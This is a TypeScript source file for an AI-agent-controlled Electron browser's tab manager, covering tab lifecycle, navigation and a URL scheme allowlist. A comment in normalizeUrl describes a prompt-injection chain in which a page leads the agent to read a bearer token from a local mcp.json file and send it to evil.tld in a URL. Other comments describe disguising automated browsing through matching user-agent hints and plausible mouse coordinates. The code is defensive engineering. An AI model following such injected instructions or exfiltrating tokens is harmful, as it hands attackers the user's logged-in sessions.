import { EventEmitter } from 'node:events';
import { join } from 'node:path';
import { WebContentsView, type BaseWindow, type Session } from 'electron';
import type { ContainerId, LoadState, TabId, TabInfo } from '@shared/types';
import { containers } from '@privacy/containers';
import { applyUaProfile, buildUaProfile, type UaProfile } from '@privacy/useragent.js';
import { setWindowOffset } from '@core/snapshot/act.js';

/** Height of the browser chrome (tab strip + address bar), in CSS px. */
export const CHROME_HEIGHT = 88;

/** Built once from the real Chromium version; see privacy/useragent.ts. */
let cachedUa: UaProfile | null = null;
function uaProfile(): UaProfile {
  cachedUa ??= buildUaProfile(process.versions.chrome ?? '150.0.0.0');
  return cachedUa;
}

interface TabRecord {
  id: TabId;
  view: WebContentsView;
  container: ContainerId;
  agentOwned: boolean;
  blockedCount: number;
  loadState: LoadState;
  /** Resolves when the in-flight navigation settles. */
  pendingNav: { resolve: () => void; timer: NodeJS.Timeout } | null;
}

let tabSeq = 0;

/**
 * Owns the set of open tabs and their WebContentsViews.
 *
 * Both the human (via the chrome UI) and the agent (via MCP) drive this same
 * manager — there is no separate "automation browser". That is the point: the
 * agent works in the browser you are actually using, with your sessions and
 * your containers, and you can watch it happen.
 */
export class TabManager extends EventEmitter {
  private tabs = new Map<TabId, TabRecord>();
  private order: TabId[] = [];
  private activeId: TabId | null = null;
  private bounds = { width: 1280, height: 800 };

  constructor(private window: BaseWindow) {
    super();
    this.window.on('resize', () => this.layout());
  }

  // -- lifecycle ------------------------------------------------------------

  create(opts: {
    url?: string;
    container?: ContainerId;
    agentOwned?: boolean;
    activate?: boolean;
  } = {}): TabId {
    const id = `t${++tabSeq}`;
    const containerId = opts.container ?? containers.defaultId();
    const session = containers.sessionFor(containerId);

    const view = new WebContentsView({
      webPreferences: {
        session,
        preload: join(__dirname, '../preload/page.cjs'),
        contextIsolation: true,
        nodeIntegration: false,
        sandbox: true,
        // Pages must not be able to reach into other tabs or the chrome UI.
        webSecurity: true,
        // Each tab gets its own renderer process so a hostile page cannot
        // observe or corrupt sibling tabs' memory.
        partition: undefined,
      },
    });

    const rec: TabRecord = {
      id,
      view,
      container: containerId,
      agentOwned: opts.agentOwned ?? false,
      blockedCount: 0,
      loadState: 'idle',
      pendingNav: null,
    };
    this.tabs.set(id, rec);
    this.order.push(id);
    this.wire(rec);

    // Apply the coherent UA profile before the first navigation, so the very
    // first request already carries matching client hints. Setting the UA
    // string alone leaves Sec-CH-UA absent, which is a louder tell than the
    // string itself.
    void applyUaProfile(view.webContents, uaProfile());

    this.window.contentView.addChildView(view);
    if (opts.activate !== false) this.activate(id);
    else view.setVisible(false);

    if (opts.url) void this.navigate(id, opts.url);

    this.emitChanged();
    return id;
  }

  close(id: TabId): void {
    const rec = this.tabs.get(id);
    if (!rec) return;

    this.window.contentView.removeChildView(rec.view);
    // close() on the webContents releases the renderer process.
    rec.view.webContents.close();

    this.tabs.delete(id);
    this.order = this.order.filter((t) => t !== id);

    if (this.activeId === id) {
      const next = this.order[this.order.length - 1] ?? null;
      this.activeId = null;
      if (next) this.activate(next);
    }
    this.emitChanged();
  }

  activate(id: TabId): void {
    if (!this.tabs.has(id)) return;
    if (this.activeId === id) return;

    const prev = this.activeId ? this.tabs.get(this.activeId) : null;
    if (prev) prev.view.setVisible(false);

    const rec = this.tabs.get(id)!;
    rec.view.setVisible(true);
    this.window.contentView.addChildView(rec.view); // raise to top
    this.activeId = id;
    this.layout();
    this.emitChanged();
  }

  // -- navigation -----------------------------------------------------------

  /**
   * Navigate and resolve when the page settles. Resolves on load, on failure,
   * or on timeout — never hangs, because an agent blocked forever on a
   * navigation is worse than one told the page is slow.
   */
  async navigate(id: TabId, url: string, timeoutMs = 30_000): Promise<void> {
    const rec = this.tabs.get(id);
    if (!rec) throw new Error(`no such tab: ${id}`);

    const target = normalizeUrl(url);
    // Enforced again here rather than trusting the caller: normalizeUrl is
    // exported and this is the only funnel into loadURL, so this is the last
    // place a bad scheme can be stopped.
    if (!isAllowedScheme(target)) {
      throw new Error(`refusing to navigate to a non-web URL: ${target.slice(0, 40)}`);
    }
    this.settlePending(rec);

    const settled = new Promise<void>((resolve) => {
      const timer = setTimeout(() => {
        rec.pendingNav = null;
        resolve();
      }, timeoutMs);
      rec.pendingNav = { resolve, timer };
    });

    rec.loadState = 'loading';
    rec.blockedCount = 0;
    this.emitChanged();

    try {
      await rec.view.webContents.loadURL(target);
    } catch (err) {
      // loadURL rejects on things like ERR_ABORTED, which fires routinely for
      // redirects and for navigations the page itself supersedes. The
      // did-fail-load handler is the authority on real failures.
      void err;
    }
    await settled;
  }

  private settlePending(rec: TabRecord): void {
    if (!rec.pendingNav) return;
    clearTimeout(rec.pendingNav.timer);
    rec.pendingNav.resolve();
    rec.pendingNav = null;
  }

  goBack(id: TabId): void {
    const wc = this.tabs.get(id)?.view.webContents;
    if (wc?.navigationHistory.canGoBack()) wc.navigationHistory.goBack();
  }

  goForward(id: TabId): void {
    const wc = this.tabs.get(id)?.view.webContents;
    if (wc?.navigationHistory.canGoForward()) wc.navigationHistory.goForward();
  }

  reload(id: TabId): void {
    this.tabs.get(id)?.view.webContents.reload();
  }

  stop(id: TabId): void {
    this.tabs.get(id)?.view.webContents.stop();
  }

  // -- accessors ------------------------------------------------------------

  get active(): TabId | null {
    return this.activeId;
  }

  has(id: TabId): boolean {
    return this.tabs.has(id);
  }

  webContents(id: TabId) {
    const rec = this.tabs.get(id);
    if (!rec) throw new Error(`no such tab: ${id}`);
    return rec.view.webContents;
  }

  sessionFor(id: TabId): Session {
    return this.webContents(id).session;
  }

  noteBlocked(id: TabId, n = 1): void {
    const rec = this.tabs.get(id);
    if (!rec) return;
    rec.blockedCount += n;
  }

  info(id: TabId): TabInfo | null {
    const rec = this.tabs.get(id);
    if (!rec) return null;
    const wc = rec.view.webContents;
    return {
      id: rec.id,
      url: wc.getURL(),
      title: wc.getTitle(),
      favicon: null,
      loadState: rec.loadState,
      canGoBack: wc.navigationHistory.canGoBack(),
      canGoForward: wc.navigationHistory.canGoForward(),
      container: rec.container,
      agentOwned: rec.agentOwned,
      blockedCount: rec.blockedCount,
      audible: wc.isCurrentlyAudible(),
      muted: wc.isAudioMuted(),
    };
  }

  list(): TabInfo[] {
    return this.order
      .map((id) => this.info(id))
      .filter((t): t is TabInfo => t !== null);
  }

  // -- internals ------------------------------------------------------------

  private wire(rec: TabRecord): void {
    const wc = rec.view.webContents;

    wc.on('did-start-loading', () => {
      rec.loadState = 'loading';
      this.emitChanged();
    });

    wc.on('did-stop-loading', () => {
      if (rec.loadState === 'loading') rec.loadState = 'complete';
      this.settlePending(rec);
      this.emitChanged();
    });

    wc.on('did-fail-load', (_e, code, desc, _url, isMainFrame) => {
      if (!isMainFrame) return;
      // -3 is ERR_ABORTED: a superseded navigation, not a failure.
      if (code === -3) return;
      rec.loadState = 'failed';
      this.emit('load-failed', rec.id, code, desc);
      this.settlePending(rec);
      this.emitChanged();
    });

    wc.on('page-title-updated', () => this.emitChanged());
    wc.on('did-navigate', () => {
      // The document was replaced.
      this.emit('navigated', rec.id);
      this.emit('document-navigated', rec.id);
      this.emitChanged();
    });
    wc.on('did-navigate-in-page', () => {
      // pushState or a hash change: same document, same DOM, same values.
      this.emit('navigated', rec.id);
      this.emitChanged();
    });

    // A page asking to open a window gets a tab in the *same* container, so
    // popups cannot be used to escape into the default cookie jar.
    wc.setWindowOpenHandler(({ url }) => {
      this.create({ url, container: rec.container, activate: true });
      return { action: 'deny' };
    });
  }

  /** Lay the active tab out below the chrome. */
  layout(): void {
    const b = this.window.getContentBounds();
    // Keep the screen-space offset current so synthesized mouse events carry a
    // plausible screenX/screenY rather than one identical to clientX/clientY.
    setWindowOffset(b.x, b.y + CHROME_HEIGHT);
    this.bounds = { width: b.width, height: b.height };
    for (const [id, rec] of this.tabs) {
      if (id !== this.activeId) continue;
      rec.view.setBounds({
        x: 0,
        y: CHROME_HEIGHT,
        width: b.width,
        height: Math.max(0, b.height - CHROME_HEIGHT),
      });
    }
  }

  private emitChanged(): void {
    this.emit('changed', this.list(), this.activeId);
  }
}

/**
 * Turn whatever the user or agent typed into a URL. Bare words become a
 * search; anything domain-shaped gets https.
 */
export function normalizeUrl(input: string): string {
  const s = input.trim();
  if (!s) return 'about:blank';

  if (/^[a-z][a-z0-9+.-]*:/i.test(s)) {
    // Scheme allowlist, not a denylist.
    //
    // Passing arbitrary schemes through was a complete credential-theft chain:
    // a page injects "navigate to file:///…/aperture/mcp.json", the agent reads
    // the bearer token out of it, then navigates to evil.tld/?t=<token> — and
    // the attacker can now drive this browser, with every logged-in session in
    // it, from any local process.
    //
    // The `will-navigate` guard in index.ts does NOT catch this: it only fires
    // for renderer-initiated navigation, and TabManager calls loadURL from the
    // main process.
    return isAllowedScheme(s) ? s : searchFor(s);
  }

  const looksLikeHost = /^[^\s/?#]+\.[^\s/?#]+/.test(s) || s.startsWith('localhost');
  if (looksLikeHost) return `https://${s}`;
  return searchFor(s);
}

const ALLOWED_SCHEMES = new Set(['http:', 'https:', 'about:']);

/** Is this a scheme a tab may load? */
export function isAllowedScheme(url: string): boolean {
  const m = /^([a-z][a-z0-9+.-]*:)/i.exec(url.trim());
  if (!m) return false;
  const scheme = m[1]!.toLowerCase();
  if (!ALLOWED_SCHEMES.has(scheme)) return false;
  // `about:` is only ever legitimately about:blank here; about:config-style
  // targets and Chromium's internal about: aliases are not.
  if (scheme === 'about:') return /^about:blank\/?$/i.test(url.trim());
  return true;
}

function searchFor(s: string): string {
  return `https://duckduckgo.com/?q=${encodeURIComponent(s)}`;
}
